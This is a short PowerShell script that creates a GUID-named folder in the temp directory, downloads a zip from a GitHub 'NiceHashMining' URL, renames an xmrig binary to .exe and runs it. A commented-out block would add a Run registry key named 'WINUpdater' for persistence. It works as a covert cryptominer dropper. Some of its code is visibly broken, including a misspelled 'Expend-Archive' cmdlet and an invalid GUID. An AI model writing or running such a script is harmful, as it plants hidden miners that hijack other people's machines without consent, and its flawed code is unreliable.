#------------------------------------------------------------------------------------------------------------------------------------
$null = New-Item -Path $env:temp -Name "D13C3D8C-8A17-4898-G36A-6294B340288A" -ItemType "directory"
Set-Location -Path "$env:temp/D13C3D8C-8A17-4898-G36A-6294B340288A"

#------------------------------------------------------------------------------------------------------------------------------------
$URL = "https://github.com/SnowGlobeio/NiceHashMining/Nicehash.zip"
$PathtoSave = "Nicehash.zip"

Invoke-WebRequest -URI $URL -OutFile $PathtoSave; Expend-Archive -DestinationPath .

#Expand-Archive Nicehash.zip -DestinationPath .

#New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
#    -Name "WINUpdater" `
#    -Value "$env:temp/D13C3D8C-8A17-4898-G36A-6294B340288A/xmrig.exe"

Rename-Item -Path NiceHash/xmrig -NewName NiceHash/xmrig.exe
.\NiceHash\xmrig.exe

